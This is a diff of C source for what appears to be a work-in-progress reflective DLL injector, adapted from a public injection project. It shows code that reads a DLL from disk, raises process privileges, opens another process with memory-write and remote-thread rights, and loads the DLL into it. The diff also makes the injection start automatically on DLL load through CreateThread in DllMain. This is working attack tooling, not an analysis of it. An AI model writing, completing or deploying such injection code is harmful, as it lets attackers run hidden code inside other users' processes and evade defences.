@@ -1,14 +1,16 @@
 /* should compile into installer_x64.dll or installer_x86.dll depending on target os */
 // LoadRemoteLibraryR() equivalent goes in here
 
+#include "LoadLibraryManual.h"
 #include "installer.h"
 
 // TODO: manually resolve all these windows api calls
+#include <windows.h>
 
 
 // Adapted from:
 // https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/Inject.c
-void start()
+void start() // TODO: change to be DWORD WINAPI start(LPVOID lpParam)
 {
 	// do while loop start // TODO: add this if i want the ability to add error handling with break statements?
 
@@ -33,14 +35,17 @@ void start()
 	HANDLE hFile = CreateFileA(targetDll, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	// get size of targetDll
-	dwLength = GetFileSize(hFile, NULL);
+	DWORD dwLength = GetFileSize(hFile, NULL);
 
 	// allocate memory to write targetDll into memory
-	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
+	LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
 
+	DWORD dwBytesRead = 0;
 	// reads the entire dll into memory
-	ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL);
+	BOOL successful_read = ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL);
 
+	TOKEN_PRIVILEGES priv = {0};
+	HANDLE hToken = NULL;
 	// get process token so we can change permissions of the process to allow us to open and inject into another process
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 	{
@@ -52,17 +57,17 @@ void start()
 		{
 			AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL  );
 		}
-		CloseHandle( hToken  );
+		CloseHandle(hToken);
 	}
 	
 
 	// Opens the target process with rights to write memory and create remote threads
-	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
 
 	// Calls LoadRemoteLibraryR to perform reflective DLL injection
 	// Loads targetDll into memory
 	//hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
-	hModule = LoadLibraryManual(hProcess, lpBuffer, dwLength, NULL);
+	HANDLE hModule = LoadLibraryManual(hProcess, lpBuffer, dwLength, NULL);
 
 	// Waits for the remote thread to finish
 	WaitForSingleObject(hModule, INFINITE);
@@ -93,7 +98,12 @@ BOOL WINAPI DllMain(
 		case DLL_PROCESS_ATTACH:
 			// Initialize once for each new process.
 			// Return FALSE to fail DLL load.
-			start();
+			DisableThreadLibraryCalls(hinstDLL);
+			// NOTE: this is needed cuz calling start() without using CreateThread
+			// could cause loader lock problems 
+			// CreateThread(NULL: SecurityAttributes, 0: StackSize, start: function i want to run, NULL: paramter for start function, 0: Create flag settings... should thread run immeditly after creation, NULL: ptr to store thread identifier)
+			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start, NULL, 0, NULL); 
+			//start();
 			break;
 
 		case DLL_THREAD_ATTACH:
